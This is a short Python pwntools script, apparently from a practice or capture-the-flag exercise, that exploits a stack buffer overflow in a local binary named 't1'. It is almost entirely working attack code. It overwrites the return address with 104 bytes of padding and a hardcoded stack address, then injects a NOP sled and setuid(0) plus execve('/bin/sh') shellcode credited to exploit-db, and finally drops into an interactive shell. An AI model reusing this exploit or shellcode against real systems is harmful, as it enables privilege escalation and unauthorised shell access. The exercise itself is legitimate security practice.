#!/usr/bin/env python3

from pwn import *

context.update(arch='amd64', os='linux') # set arch

p = process('./t1')
p.sendline('304')

#gdb.attach(p, '''
#b *vuln
#b *vuln+1029
#''')

# A little bit of nops but i dont think i need them 
shellcode  = ("\x90" * 20)
# https://www.exploit-db.com/exploits/13320
# Linux/x64 - setuid(0) + execve(/bin/sh) Shellcode (49 bytes) 
shellcode += "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f"
shellcode += "\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7"
shellcode += "\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01"
shellcode += "\x5f\x6a\x3c\x58\x0f\x05"


overflow_to_ret = "A" * 104
# i should learn how to use pwntools 
# i can't concatenate str and bytes
#ret = p64(0x00007fffffffdda8)
ret = "\x18\xde\xff\xff\xff\x7f\x00\x00"

# overflowing until ret address, overwriting ret address in stack
# with the address of shellcode, past the ret address because
# before the code mess up with something and im too lazy to investigate
exploit = ''
exploit += overflow_to_ret
exploit += ret
exploit += shellcode

p.send(exploit)
p.interactive()
